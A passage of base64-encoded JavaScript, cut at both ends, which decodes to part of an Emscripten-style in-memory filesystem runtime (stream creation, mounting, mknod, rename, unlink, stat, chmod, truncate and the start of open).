mVhbSxmZF9zdGFydCxmZF9lbmQpe2lmKCFGUy5GU1N0cmVhbSl7RlMuRlNTdHJlYW09KGZ1bmN0aW9uKCl7fSk7RlMuRlNTdHJlYW0ucHJvdG90eXBlPXt9O09iamVjdC5kZWZpbmVQcm9wZXJ0aWVzKEZTLkZTU3RyZWFtLnByb3RvdHlwZSx7b2JqZWN0OntnZXQ6KGZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMubm9kZX0pLHNldDooZnVuY3Rpb24odmFsKXt0aGlzLm5vZGU9dmFsfSl9LGlzUmVhZDp7Z2V0OihmdW5jdGlvbigpe3JldHVybih0aGlzLmZsYWdzJjIwOTcxNTUpIT09MX0pfSxpc1dyaXRlOntnZXQ6KGZ1bmN0aW9uKCl7cmV0dXJuKHRoaXMuZmxhZ3MmMjA5NzE1NSkhPT0wfSl9LGlzQXBwZW5kOntnZXQ6KGZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuZmxhZ3MmMTAyNH0pfX0pfQp2YXIgbmV3U3RyZWFtPW5ldyBGUy5GU1N0cmVhbTtmb3IodmFyIHAgaW4gc3RyZWFtKXtuZXdTdHJlYW1bcF09c3RyZWFtW3BdfQpzdHJlYW09bmV3U3RyZWFtO3ZhciBmZD1GUy5uZXh0ZmQoZmRfc3RhcnQsZmRfZW5kKTtzdHJlYW0uZmQ9ZmQ7RlMuc3RyZWFtc1tmZF09c3RyZWFtO3JldHVybiBzdHJlYW19KSxjbG9zZVN0cmVhbTooZnVuY3Rpb24oZmQpe0ZTLnN0cmVhbXNbZmRdPW51bGx9KSxjaHJkZXZfc3RyZWFtX29wczp7b3BlbjooZnVuY3Rpb24oc3RyZWFtKXt2YXIgZGV2aWNlPUZTLmdldERldmljZShzdHJlYW0ubm9kZS5yZGV2KTtzdHJlYW0uc3RyZWFtX29wcz1kZXZpY2Uuc3RyZWFtX29wcztpZihzdHJlYW0uc3RyZWFtX29wcy5vcGVuKXtzdHJlYW0uc3RyZWFtX29wcy5vcGVuKHN0cmVhbSl9fSksbGxzZWVrOihmdW5jdGlvbigpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVTUElQRSl9KX0sbWFqb3I6KGZ1bmN0aW9uKGRldil7cmV0dXJuIGRldj4+OH0pLG1pbm9yOihmdW5jdGlvbihkZXYpe3JldHVybiBkZXYmMjU1fSksbWFrZWRldjooZnVuY3Rpb24obWEsbWkpe3JldHVybiBtYTw8OHxtaX0pLHJlZ2lzdGVyRGV2aWNlOihmdW5jdGlvbihkZXYsb3BzKXtGUy5kZXZpY2VzW2Rldl09e3N0cmVhbV9vcHM6b3BzfX0pLGdldERldmljZTooZnVuY3Rpb24oZGV2KXtyZXR1cm4gRlMuZGV2aWNlc1tkZXZdfSksZ2V0TW91bnRzOihmdW5jdGlvbihtb3VudCl7dmFyIG1vdW50cz1bXTt2YXIgY2hlY2s9W21vdW50XTt3aGlsZShjaGVjay5sZW5ndGgpe3ZhciBtPWNoZWNrLnBvcCgpO21vdW50cy5wdXNoKG0pO2NoZWNrLnB1c2guYXBwbHkoY2hlY2ssbS5tb3VudHMpfQpyZXR1cm4gbW91bnRzfSksc3luY2ZzOihmdW5jdGlvbihwb3B1bGF0ZSxjYWxsYmFjayl7aWYodHlwZW9mIHBvcHVsYXRlPT09ImZ1bmN0aW9uIil7Y2FsbGJhY2s9cG9wdWxhdGU7cG9wdWxhdGU9ITF9CkZTLnN5bmNGU1JlcXVlc3RzKys7aWYoRlMuc3luY0ZTUmVxdWVzdHM+MSl7Y29uc29sZS5sb2coIndhcm5pbmc6ICIrRlMuc3luY0ZTUmVxdWVzdHMrIiBGUy5zeW5jZnMgb3BlcmF0aW9ucyBpbiBmbGlnaHQgYXQgb25jZSwgcHJvYmFibHkganVzdCBkb2luZyBleHRyYSB3b3JrIil9CnZhciBtb3VudHM9RlMuZ2V0TW91bnRzKEZTLnJvb3QubW91bnQpO3ZhciBjb21wbGV0ZWQ9MDtmdW5jdGlvbiBkb0NhbGxiYWNrKGVycil7YXNzZXJ0KEZTLnN5bmNGU1JlcXVlc3RzPjApO0ZTLnN5bmNGU1JlcXVlc3RzLS07cmV0dXJuIGNhbGxiYWNrKGVycil9CmZ1bmN0aW9uIGRvbmUoZXJyKXtpZihlcnIpe2lmKCFkb25lLmVycm9yZWQpe2RvbmUuZXJyb3JlZD0hMDtyZXR1cm4gZG9DYWxsYmFjayhlcnIpfQpyZXR1cm59CmlmKCsrY29tcGxldGVkPj1tb3VudHMubGVuZ3RoKXtkb0NhbGxiYWNrKG51bGwpfX0KbW91bnRzLmZvckVhY2goKGZ1bmN0aW9uKG1vdW50KXtpZighbW91bnQudHlwZS5zeW5jZnMpe3JldHVybiBkb25lKG51bGwpfQptb3VudC50eXBlLnN5bmNmcyhtb3VudCxwb3B1bGF0ZSxkb25lKX0pKX0pLG1vdW50OihmdW5jdGlvbih0eXBlLG9wdHMsbW91bnRwb2ludCl7dmFyIHJvb3Q9bW91bnRwb2ludD09PSIvIjt2YXIgcHNldWRvPSFtb3VudHBvaW50O3ZhciBub2RlO2lmKHJvb3QmJkZTLnJvb3Qpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVCVVNZKX1lbHNlIGlmKCFyb290JiYhcHNldWRvKXt2YXIgbG9va3VwPUZTLmxvb2t1cFBhdGgobW91bnRwb2ludCx7Zm9sbG93X21vdW50OiExfSk7bW91bnRwb2ludD1sb29rdXAucGF0aDtub2RlPWxvb2t1cC5ub2RlO2lmKEZTLmlzTW91bnRwb2ludChub2RlKSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUJVU1kpfQppZighRlMuaXNEaXIobm9kZS5tb2RlKSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PVERJUil9fQp2YXIgbW91bnQ9e3R5cGU6dHlwZSxvcHRzOm9wdHMsbW91bnRwb2ludDptb3VudHBvaW50LG1vdW50czpbXX07dmFyIG1vdW50Um9vdD10eXBlLm1vdW50KG1vdW50KTttb3VudFJvb3QubW91bnQ9bW91bnQ7bW91bnQucm9vdD1tb3VudFJvb3Q7aWYocm9vdCl7RlMucm9vdD1tb3VudFJvb3R9ZWxzZSBpZihub2RlKXtub2RlLm1vdW50ZWQ9bW91bnQ7aWYobm9kZS5tb3VudCl7bm9kZS5tb3VudC5tb3VudHMucHVzaChtb3VudCl9fQpyZXR1cm4gbW91bnRSb290fSksdW5tb3VudDooZnVuY3Rpb24obW91bnRwb2ludCl7dmFyIGxvb2t1cD1GUy5sb29rdXBQYXRoKG1vdW50cG9pbnQse2ZvbGxvd19tb3VudDohMX0pO2lmKCFGUy5pc01vdW50cG9pbnQobG9va3VwLm5vZGUpKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU5WQUwpfQp2YXIgbm9kZT1sb29rdXAubm9kZTt2YXIgbW91bnQ9bm9kZS5tb3VudGVkO3ZhciBtb3VudHM9RlMuZ2V0TW91bnRzKG1vdW50KTtPYmplY3Qua2V5cyhGUy5uYW1lVGFibGUpLmZvckVhY2goKGZ1bmN0aW9uKGhhc2gpe3ZhciBjdXJyZW50PUZTLm5hbWVUYWJsZVtoYXNoXTt3aGlsZShjdXJyZW50KXt2YXIgbmV4dD1jdXJyZW50Lm5hbWVfbmV4dDtpZihtb3VudHMuaW5kZXhPZihjdXJyZW50Lm1vdW50KSE9PS0xKXtGUy5kZXN0cm95Tm9kZShjdXJyZW50KX0KY3VycmVudD1uZXh0fX0pKTtub2RlLm1vdW50ZWQ9bnVsbDt2YXIgaWR4PW5vZGUubW91bnQubW91bnRzLmluZGV4T2YobW91bnQpO2Fzc2VydChpZHghPT0tMSk7bm9kZS5tb3VudC5tb3VudHMuc3BsaWNlKGlkeCwxKX0pLGxvb2t1cDooZnVuY3Rpb24ocGFyZW50LG5hbWUpe3JldHVybiBwYXJlbnQubm9kZV9vcHMubG9va3VwKHBhcmVudCxuYW1lKX0pLG1rbm9kOihmdW5jdGlvbihwYXRoLG1vZGUsZGV2KXt2YXIgbG9va3VwPUZTLmxvb2t1cFBhdGgocGF0aCx7cGFyZW50OiEwfSk7dmFyIHBhcmVudD1sb29rdXAubm9kZTt2YXIgbmFtZT1QQVRILmJhc2VuYW1lKHBhdGgpO2lmKCFuYW1lfHxuYW1lPT09Ii4ifHxuYW1lPT09Ii4uIil7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKX0KdmFyIGVycj1GUy5tYXlDcmVhdGUocGFyZW50LG5hbWUpO2lmKGVycil7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoZXJyKX0KaWYoIXBhcmVudC5ub2RlX29wcy5ta25vZCl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRVBFUk0pfQpyZXR1cm4gcGFyZW50Lm5vZGVfb3BzLm1rbm9kKHBhcmVudCxuYW1lLG1vZGUsZGV2KX0pLGNyZWF0ZTooZnVuY3Rpb24ocGF0aCxtb2RlKXttb2RlPW1vZGUhPT11bmRlZmluZWQ/bW9kZTo0Mzg7bW9kZSY9NDA5NTttb2RlfD0zMjc2ODtyZXR1cm4gRlMubWtub2QocGF0aCxtb2RlLDApfSksbWtkaXI6KGZ1bmN0aW9uKHBhdGgsbW9kZSl7bW9kZT1tb2RlIT09dW5kZWZpbmVkP21vZGU6NTExO21vZGUmPTUxMXw1MTI7bW9kZXw9MTYzODQ7cmV0dXJuIEZTLm1rbm9kKHBhdGgsbW9kZSwwKX0pLG1rZGlyVHJlZTooZnVuY3Rpb24ocGF0aCxtb2RlKXt2YXIgZGlycz1wYXRoLnNwbGl0KCIvIik7dmFyIGQ9IiI7Zm9yKHZhciBpPTA7aTxkaXJzLmxlbmd0aDsrK2kpe2lmKCFkaXJzW2ldKWNvbnRpbnVlO2QrPSIvIitkaXJzW2ldO3RyeXtGUy5ta2RpcihkLG1vZGUpfWNhdGNoKGUpe2lmKGUuZXJybm8hPUVSUk5PX0NPREVTLkVFWElTVCl0aHJvdyBlfX19KSxta2RldjooZnVuY3Rpb24ocGF0aCxtb2RlLGRldil7aWYodHlwZW9mIGRldj09PSJ1bmRlZmluZWQiKXtkZXY9bW9kZTttb2RlPTQzOH0KbW9kZXw9ODE5MjtyZXR1cm4gRlMubWtub2QocGF0aCxtb2RlLGRldil9KSxzeW1saW5rOihmdW5jdGlvbihvbGRwYXRoLG5ld3BhdGgpe2lmKCFQQVRILnJlc29sdmUob2xkcGF0aCkpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOT0VOVCl9CnZhciBsb29rdXA9RlMubG9va3VwUGF0aChuZXdwYXRoLHtwYXJlbnQ6ITB9KTt2YXIgcGFyZW50PWxvb2t1cC5ub2RlO2lmKCFwYXJlbnQpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOT0VOVCl9CnZhciBuZXduYW1lPVBBVEguYmFzZW5hbWUobmV3cGF0aCk7dmFyIGVycj1GUy5tYXlDcmVhdGUocGFyZW50LG5ld25hbWUpO2lmKGVycil7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoZXJyKX0KaWYoIXBhcmVudC5ub2RlX29wcy5zeW1saW5rKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FUEVSTSl9CnJldHVybiBwYXJlbnQubm9kZV9vcHMuc3ltbGluayhwYXJlbnQsbmV3bmFtZSxvbGRwYXRoKX0pLHJlbmFtZTooZnVuY3Rpb24ob2xkX3BhdGgsbmV3X3BhdGgpe3ZhciBvbGRfZGlybmFtZT1QQVRILmRpcm5hbWUob2xkX3BhdGgpO3ZhciBuZXdfZGlybmFtZT1QQVRILmRpcm5hbWUobmV3X3BhdGgpO3ZhciBvbGRfbmFtZT1QQVRILmJhc2VuYW1lKG9sZF9wYXRoKTt2YXIgbmV3X25hbWU9UEFUSC5iYXNlbmFtZShuZXdfcGF0aCk7dmFyIGxvb2t1cCxvbGRfZGlyLG5ld19kaXI7dHJ5e2xvb2t1cD1GUy5sb29rdXBQYXRoKG9sZF9wYXRoLHtwYXJlbnQ6ITB9KTtvbGRfZGlyPWxvb2t1cC5ub2RlO2xvb2t1cD1GUy5sb29rdXBQYXRoKG5ld19wYXRoLHtwYXJlbnQ6ITB9KTtuZXdfZGlyPWxvb2t1cC5ub2RlfWNhdGNoKGUpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVCVVNZKX0KaWYoIW9sZF9kaXJ8fCFuZXdfZGlyKXRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOT0VOVCk7aWYob2xkX2Rpci5tb3VudCE9PW5ld19kaXIubW91bnQpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVYREVWKX0KdmFyIG9sZF9ub2RlPUZTLmxvb2t1cE5vZGUob2xkX2RpcixvbGRfbmFtZSk7dmFyIHJlbGF0aXZlPVBBVEgucmVsYXRpdmUob2xkX3BhdGgsbmV3X2Rpcm5hbWUpO2lmKHJlbGF0aXZlLmNoYXJBdCgwKSE9PSIuIil7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKX0KcmVsYXRpdmU9UEFUSC5yZWxhdGl2ZShuZXdfcGF0aCxvbGRfZGlybmFtZSk7aWYocmVsYXRpdmUuY2hhckF0KDApIT09Ii4iKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTk9URU1QVFkpfQp2YXIgbmV3X25vZGU7dHJ5e25ld19ub2RlPUZTLmxvb2t1cE5vZGUobmV3X2RpcixuZXdfbmFtZSl9Y2F0Y2goZSl7fQppZihvbGRfbm9kZT09PW5ld19ub2RlKXtyZXR1cm59CnZhciBpc2Rpcj1GUy5pc0RpcihvbGRfbm9kZS5tb2RlKTt2YXIgZXJyPUZTLm1heURlbGV0ZShvbGRfZGlyLG9sZF9uYW1lLGlzZGlyKTtpZihlcnIpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKGVycil9CmVycj1uZXdfbm9kZT9GUy5tYXlEZWxldGUobmV3X2RpcixuZXdfbmFtZSxpc2Rpcik6RlMubWF5Q3JlYXRlKG5ld19kaXIsbmV3X25hbWUpO2lmKGVycil7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoZXJyKX0KaWYoIW9sZF9kaXIubm9kZV9vcHMucmVuYW1lKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FUEVSTSl9CmlmKEZTLmlzTW91bnRwb2ludChvbGRfbm9kZSl8fG5ld19ub2RlJiZGUy5pc01vdW50cG9pbnQobmV3X25vZGUpKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FQlVTWSl9CmlmKG5ld19kaXIhPT1vbGRfZGlyKXtlcnI9RlMubm9kZVBlcm1pc3Npb25zKG9sZF9kaXIsInciKTtpZihlcnIpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKGVycil9fQp0cnl7aWYoRlMudHJhY2tpbmdEZWxlZ2F0ZS53aWxsTW92ZVBhdGgpe0ZTLnRyYWNraW5nRGVsZWdhdGUud2lsbE1vdmVQYXRoKG9sZF9wYXRoLG5ld19wYXRoKX19Y2F0Y2goZSl7Y29uc29sZS5sb2coIkZTLnRyYWNraW5nRGVsZWdhdGVbXCd3aWxsTW92ZVBhdGhcJ10oXCciK29sZF9wYXRoKyJcJywgXCciK25ld19wYXRoKyJcJykgdGhyZXcgYW4gZXhjZXB0aW9uOiAiK2UubWVzc2FnZSl9CkZTLmhhc2hSZW1vdmVOb2RlKG9sZF9ub2RlKTt0cnl7b2xkX2Rpci5ub2RlX29wcy5yZW5hbWUob2xkX25vZGUsbmV3X2RpcixuZXdfbmFtZSl9Y2F0Y2goZSl7dGhyb3cgZX1maW5hbGx5e0ZTLmhhc2hBZGROb2RlKG9sZF9ub2RlKX0KdHJ5e2lmKEZTLnRyYWNraW5nRGVsZWdhdGUub25Nb3ZlUGF0aClGUy50cmFja2luZ0RlbGVnYXRlLm9uTW92ZVBhdGgob2xkX3BhdGgsbmV3X3BhdGgpfWNhdGNoKGUpe2NvbnNvbGUubG9nKCJGUy50cmFja2luZ0RlbGVnYXRlW1wnb25Nb3ZlUGF0aFwnXShcJyIrb2xkX3BhdGgrIlwnLCBcJyIrbmV3X3BhdGgrIlwnKSB0aHJldyBhbiBleGNlcHRpb246ICIrZS5tZXNzYWdlKX19KSxybWRpcjooZnVuY3Rpb24ocGF0aCl7dmFyIGxvb2t1cD1GUy5sb29rdXBQYXRoKHBhdGgse3BhcmVudDohMH0pO3ZhciBwYXJlbnQ9bG9va3VwLm5vZGU7dmFyIG5hbWU9UEFUSC5iYXNlbmFtZShwYXRoKTt2YXIgbm9kZT1GUy5sb29rdXBOb2RlKHBhcmVudCxuYW1lKTt2YXIgZXJyPUZTLm1heURlbGV0ZShwYXJlbnQsbmFtZSwhMCk7aWYoZXJyKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihlcnIpfQppZighcGFyZW50Lm5vZGVfb3BzLnJtZGlyKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FUEVSTSl9CmlmKEZTLmlzTW91bnRwb2ludChub2RlKSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUJVU1kpfQp0cnl7aWYoRlMudHJhY2tpbmdEZWxlZ2F0ZS53aWxsRGVsZXRlUGF0aCl7RlMudHJhY2tpbmdEZWxlZ2F0ZS53aWxsRGVsZXRlUGF0aChwYXRoKX19Y2F0Y2goZSl7Y29uc29sZS5sb2coIkZTLnRyYWNraW5nRGVsZWdhdGVbXCd3aWxsRGVsZXRlUGF0aFwnXShcJyIrcGF0aCsiXCcpIHRocmV3IGFuIGV4Y2VwdGlvbjogIitlLm1lc3NhZ2UpfQpwYXJlbnQubm9kZV9vcHMucm1kaXIocGFyZW50LG5hbWUpO0ZTLmRlc3Ryb3lOb2RlKG5vZGUpO3RyeXtpZihGUy50cmFja2luZ0RlbGVnYXRlLm9uRGVsZXRlUGF0aClGUy50cmFja2luZ0RlbGVnYXRlLm9uRGVsZXRlUGF0aChwYXRoKX1jYXRjaChlKXtjb25zb2xlLmxvZygiRlMudHJhY2tpbmdEZWxlZ2F0ZVtcJ29uRGVsZXRlUGF0aFwnXShcJyIrcGF0aCsiXCcpIHRocmV3IGFuIGV4Y2VwdGlvbjogIitlLm1lc3NhZ2UpfX0pLHJlYWRkaXI6KGZ1bmN0aW9uKHBhdGgpe3ZhciBsb29rdXA9RlMubG9va3VwUGF0aChwYXRoLHtmb2xsb3c6ITB9KTt2YXIgbm9kZT1sb29rdXAubm9kZTtpZighbm9kZS5ub2RlX29wcy5yZWFkZGlyKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTk9URElSKX0KcmV0dXJuIG5vZGUubm9kZV9vcHMucmVhZGRpcihub2RlKX0pLHVubGluazooZnVuY3Rpb24ocGF0aCl7dmFyIGxvb2t1cD1GUy5sb29rdXBQYXRoKHBhdGgse3BhcmVudDohMH0pO3ZhciBwYXJlbnQ9bG9va3VwLm5vZGU7dmFyIG5hbWU9UEFUSC5iYXNlbmFtZShwYXRoKTt2YXIgbm9kZT1GUy5sb29rdXBOb2RlKHBhcmVudCxuYW1lKTt2YXIgZXJyPUZTLm1heURlbGV0ZShwYXJlbnQsbmFtZSwhMSk7aWYoZXJyKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihlcnIpfQppZighcGFyZW50Lm5vZGVfb3BzLnVubGluayl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRVBFUk0pfQppZihGUy5pc01vdW50cG9pbnQobm9kZSkpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVCVVNZKX0KdHJ5e2lmKEZTLnRyYWNraW5nRGVsZWdhdGUud2lsbERlbGV0ZVBhdGgpe0ZTLnRyYWNraW5nRGVsZWdhdGUud2lsbERlbGV0ZVBhdGgocGF0aCl9fWNhdGNoKGUpe2NvbnNvbGUubG9nKCJGUy50cmFja2luZ0RlbGVnYXRlW1wnd2lsbERlbGV0ZVBhdGhcJ10oXCciK3BhdGgrIlwnKSB0aHJldyBhbiBleGNlcHRpb246ICIrZS5tZXNzYWdlKX0KcGFyZW50Lm5vZGVfb3BzLnVubGluayhwYXJlbnQsbmFtZSk7RlMuZGVzdHJveU5vZGUobm9kZSk7dHJ5e2lmKEZTLnRyYWNraW5nRGVsZWdhdGUub25EZWxldGVQYXRoKUZTLnRyYWNraW5nRGVsZWdhdGUub25EZWxldGVQYXRoKHBhdGgpfWNhdGNoKGUpe2NvbnNvbGUubG9nKCJGUy50cmFja2luZ0RlbGVnYXRlW1wnb25EZWxldGVQYXRoXCddKFwnIitwYXRoKyJcJykgdGhyZXcgYW4gZXhjZXB0aW9uOiAiK2UubWVzc2FnZSl9fSkscmVhZGxpbms6KGZ1bmN0aW9uKHBhdGgpe3ZhciBsb29rdXA9RlMubG9va3VwUGF0aChwYXRoKTt2YXIgbGluaz1sb29rdXAubm9kZTtpZighbGluayl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PRU5UKX0KaWYoIWxpbmsubm9kZV9vcHMucmVhZGxpbmspe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJTlZBTCl9CnJldHVybiBQQVRILnJlc29sdmUoRlMuZ2V0UGF0aChsaW5rLnBhcmVudCksbGluay5ub2RlX29wcy5yZWFkbGluayhsaW5rKSl9KSxzdGF0OihmdW5jdGlvbihwYXRoLGRvbnRGb2xsb3cpe3ZhciBsb29rdXA9RlMubG9va3VwUGF0aChwYXRoLHtmb2xsb3c6IWRvbnRGb2xsb3d9KTt2YXIgbm9kZT1sb29rdXAubm9kZTtpZighbm9kZSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PRU5UKX0KaWYoIW5vZGUubm9kZV9vcHMuZ2V0YXR0cil7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRVBFUk0pfQpyZXR1cm4gbm9kZS5ub2RlX29wcy5nZXRhdHRyKG5vZGUpfSksbHN0YXQ6KGZ1bmN0aW9uKHBhdGgpe3JldHVybiBGUy5zdGF0KHBhdGgsITApfSksY2htb2Q6KGZ1bmN0aW9uKHBhdGgsbW9kZSxkb250Rm9sbG93KXt2YXIgbm9kZTtpZih0eXBlb2YgcGF0aD09PSJzdHJpbmciKXt2YXIgbG9va3VwPUZTLmxvb2t1cFBhdGgocGF0aCx7Zm9sbG93OiFkb250Rm9sbG93fSk7bm9kZT1sb29rdXAubm9kZX1lbHNle25vZGU9cGF0aH0KaWYoIW5vZGUubm9kZV9vcHMuc2V0YXR0cil7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRVBFUk0pfQpub2RlLm5vZGVfb3BzLnNldGF0dHIobm9kZSx7bW9kZTptb2RlJjQwOTV8bm9kZS5tb2RlJn40MDk1LHRpbWVzdGFtcDpEYXRlLm5vdygpfSl9KSxsY2htb2Q6KGZ1bmN0aW9uKHBhdGgsbW9kZSl7RlMuY2htb2QocGF0aCxtb2RlLCEwKX0pLGZjaG1vZDooZnVuY3Rpb24oZmQsbW9kZSl7dmFyIHN0cmVhbT1GUy5nZXRTdHJlYW0oZmQpO2lmKCFzdHJlYW0pe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVCQURGKX0KRlMuY2htb2Qoc3RyZWFtLm5vZGUsbW9kZSl9KSxjaG93bjooZnVuY3Rpb24ocGF0aCx1aWQsZ2lkLGRvbnRGb2xsb3cpe3ZhciBub2RlO2lmKHR5cGVvZiBwYXRoPT09InN0cmluZyIpe3ZhciBsb29rdXA9RlMubG9va3VwUGF0aChwYXRoLHtmb2xsb3c6IWRvbnRGb2xsb3d9KTtub2RlPWxvb2t1cC5ub2RlfWVsc2V7bm9kZT1wYXRofQppZighbm9kZS5ub2RlX29wcy5zZXRhdHRyKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FUEVSTSl9Cm5vZGUubm9kZV9vcHMuc2V0YXR0cihub2RlLHt0aW1lc3RhbXA6RGF0ZS5ub3coKX0pfSksbGNob3duOihmdW5jdGlvbihwYXRoLHVpZCxnaWQpe0ZTLmNob3duKHBhdGgsdWlkLGdpZCwhMCl9KSxmY2hvd246KGZ1bmN0aW9uKGZkLHVpZCxnaWQpe3ZhciBzdHJlYW09RlMuZ2V0U3RyZWFtKGZkKTtpZighc3RyZWFtKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FQkFERil9CkZTLmNob3duKHN0cmVhbS5ub2RlLHVpZCxnaWQpfSksdHJ1bmNhdGU6KGZ1bmN0aW9uKHBhdGgsbGVuKXtpZihsZW48MCl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKX0KdmFyIG5vZGU7aWYodHlwZW9mIHBhdGg9PT0ic3RyaW5nIil7dmFyIGxvb2t1cD1GUy5sb29rdXBQYXRoKHBhdGgse2ZvbGxvdzohMH0pO25vZGU9bG9va3VwLm5vZGV9ZWxzZXtub2RlPXBhdGh9CmlmKCFub2RlLm5vZGVfb3BzLnNldGF0dHIpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVQRVJNKX0KaWYoRlMuaXNEaXIobm9kZS5tb2RlKSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlTRElSKX0KaWYoIUZTLmlzRmlsZShub2RlLm1vZGUpKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU5WQUwpfQp2YXIgZXJyPUZTLm5vZGVQZXJtaXNzaW9ucyhub2RlLCJ3Iik7aWYoZXJyKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihlcnIpfQpub2RlLm5vZGVfb3BzLnNldGF0dHIobm9kZSx7c2l6ZTpsZW4sdGltZXN0YW1wOkRhdGUubm93KCl9KX0pLGZ0cnVuY2F0ZTooZnVuY3Rpb24oZmQsbGVuKXt2YXIgc3RyZWFtPUZTLmdldFN0cmVhbShmZCk7aWYoIXN0cmVhbSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUJBREYpfQppZigoc3RyZWFtLmZsYWdzJjIwOTcxNTUpPT09MCl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKX0KRlMudHJ1bmNhdGUoc3RyZWFtLm5vZGUsbGVuKX0pLHV0aW1lOihmdW5jdGlvbihwYXRoLGF0aW1lLG10aW1lKXt2YXIgbG9va3VwPUZTLmxvb2t1cFBhdGgocGF0aCx7Zm9sbG93OiEwfSk7dmFyIG5vZGU9bG9va3VwLm5vZGU7bm9kZS5ub2RlX29wcy5zZXRhdHRyKG5vZGUse3RpbWVzdGFtcDpNYXRoLm1heChhdGltZSxtdGltZSl9KX0pLG9wZW46KGZ1bmN0aW9uKHBhdGgsZmxhZ3MsbW9kZSxmZF9zdGFydCxmZF9lbmQpe2lmKHBhdGg9PT0iIil7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PRU5UKX0KZmxhZ3M9dHlwZW9mIGZsYWdzPT09InN0cmluZyI/RlMubW9kZVN0cmluZ1RvRmxhZ3MoZmxhZ3MpOmZsYWdzO21vZGU9dHlwZW9mIG1vZGU9PT0idW5kZWZpbmVkIj80Mzg6bW9kZTtpZihmbGFncyY2NCl7bW9kZT1tb2RlJjQwOTV8MzI3Njh9ZWxzZXttb2RlPTB9CnZhciBub2RlO2lmKHR5cGVvZiBwYXRoPT09Im9iamVjdCIpe25vZGU9cGF0aH1lbHNle3BhdGg9UEFUSC5ub3JtYWxpemUocGF0aCk7dHJ5e3ZhciBsb29rdXA9RlMubG9va3VwUGF0aChwYXRoLHtmb2xsb3c6IShmbGFncyYxMzEwNzIpfSk7bm9kZT1sb29rdXAubm9kZX1jYXRjaChlKXt9fQp2YXIgY3JlYXRlZD0hMTtpZihmbGFncyY2NCl7aWYobm9kZSl7aWYoZmxhZ3MmMTI4KXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FRVhJU1QpfX1lbHNle25vZGU9RlMubWtub2QocGF0aCxtb2RlLDApO2NyZWF0ZWQ9ITB9fQppZighbm9kZSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PRU5UKX0KaWYoRlMuaXNDaHJkZXYobm9kZS5tb2RlKSl7ZmxhZ3MmPX41MTJ9CmlmKGZsYWdzJjY1NTM2JiYhRlMuaXNEaXIobm9kZS5tb2RlKSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PVERJUil9CmlmKCFjcmVhdGVkKXt2YXIgZXJyPUZTLm1heU9wZW4obm9kZSxmbGFncyk7aWYo